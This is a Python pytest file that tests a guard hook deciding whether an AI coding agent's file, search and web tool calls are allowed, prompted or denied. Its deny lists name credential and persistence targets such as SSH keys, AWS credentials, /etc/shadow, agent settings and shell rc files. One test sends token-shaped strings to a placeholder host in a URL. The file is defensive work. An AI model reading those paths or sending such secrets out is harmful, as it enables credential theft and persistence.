"""File and network tool decisions."""

from __future__ import annotations

import os

import pytest
from conftest import HOME, LEVELS


@pytest.mark.parametrize(
    "path",
    [
        "/home/alice/proj/.env",
        ".env",
        ".env.production",
        ".ENV",
        "/home/alice/.ssh/id_rsa",
        "~/.aws/credentials",
        "$HOME/.gnupg/pubring.kbx",
        "/home/alice/proj/../.ssh/config",
        "./sub/../.env",
        "/proc/1/environ",
        "/etc/shadow",
        "deploy/server.pem",
        "~/.claude/.credentials.json",
    ],
)
def test_reading_secret_paths_is_denied(tool, path):
    assert tool("Read", file_path=path)[0] == LEVELS["deny"], path


@pytest.mark.parametrize(
    "path",
    ["README.md", ".env.example", ".env.sample", "src/app.py", "/home/alice/proj/.envrc", "~/.ssh.md"],
)
def test_ordinary_paths_get_no_opinion(tool, path):
    assert tool("Read", file_path=path)[0] == LEVELS["allow"], path


@pytest.mark.parametrize(
    "path",
    [
        ".claude/settings.json",
        "/home/alice/proj/.claude/settings.local.json",
        "~/.claude/settings.json",
        ".claude/hooks/pre.py",
        ".mcp.json",
        ".git/hooks/pre-commit",
        "/etc/claude-code/managed-settings.json",
        "/Library/Application Support/ClaudeCode/managed-settings.json",
        "~/.zshrc",
        "~/.bashrc",
    ],
)
@pytest.mark.parametrize("name", ["Edit", "Write", "MultiEdit"])
def test_writing_policy_and_persistence_files_is_denied(tool, name, path):
    assert tool(name, file_path=path)[0] == LEVELS["deny"], (name, path)


def test_reading_the_policy_files_is_allowed(tool):
    assert tool("Read", file_path=".claude/settings.json")[0] == LEVELS["allow"]


@pytest.mark.parametrize("path", [".github/workflows/ci.yml", ".husky/pre-commit"])
def test_editing_ci_and_hook_files_prompts(tool, path):
    assert tool("Edit", file_path=path)[0] == LEVELS["ask"]


def test_ordinary_edits_get_no_opinion(tool):
    assert tool("Edit", file_path="src/app.py", old_string="a", new_string="b")[0] == LEVELS["allow"]
    assert tool("Write", file_path="docs/notes.md", content="x")[0] == LEVELS["allow"]


def test_symlink_named_innocently_cannot_hide_a_secret(guard, tmp_path):
    secret = tmp_path / ".env"
    secret.write_text("TOKEN=x")
    link = tmp_path / "notes.txt"
    os.symlink(secret, link)
    payload = {"tool_name": "Read", "tool_input": {"file_path": str(link)}, "cwd": str(tmp_path)}
    assert guard.decide(payload, HOME)[0] == LEVELS["deny"]


def test_searching_from_home_or_root_prompts(tool):
    assert tool("Grep", path="~", pattern="token")[0] == LEVELS["ask"]
    assert tool("Glob", path="/", pattern="**/*.pem")[0] >= LEVELS["ask"]
    assert tool("Grep", path="src", pattern="token")[0] == LEVELS["allow"]


def test_searching_a_secret_directory_is_denied(tool):
    assert tool("Grep", path="~/.aws", pattern="key")[0] == LEVELS["deny"]


@pytest.mark.parametrize("name", ["WebFetch", "WebSearch", "mcp__svc__send"])
@pytest.mark.parametrize(
    "secret",
    [
        "AKIA" + "ABCDEFGHIJKLMNOP",
        "ghp_" + "a1B2" * 9,
        "github_pat_" + "A1b2C3d4" * 4,
        "xoxb-" + "1234567890-abcdefghij",
        "sk-ant-" + "api03-" + "x" * 30,
        "-----BEGIN " + "RSA PRIVATE KEY-----",
        "eyJ" + "a" * 12 + ".eyJ" + "b" * 12 + "." + "c" * 12,
    ],
)
def test_secrets_in_outbound_tool_arguments_are_denied(tool, name, secret):
    assert tool(name, url="https://x.example/?q=" + secret, prompt="summarise " + secret)[0] == LEVELS["deny"]


@pytest.mark.parametrize("name", ["WebFetch", "WebSearch", "mcp__svc__send"])
def test_generic_assignments_prompt_rather_than_block(tool, name):
    assert tool(name, query="password = hunter2hunter2hunter2")[0] == LEVELS["ask"]


@pytest.mark.parametrize("name", ["WebFetch", "mcp__svc__lookup"])
def test_ordinary_outbound_arguments_get_no_opinion(tool, name):
    assert tool(name, url="https://docs.example/page", prompt="summarise")[0] == LEVELS["allow"]


def test_tools_the_hook_does_not_cover_get_no_opinion(tool):
    assert tool("TodoWrite", todos=[])[0] == LEVELS["allow"]
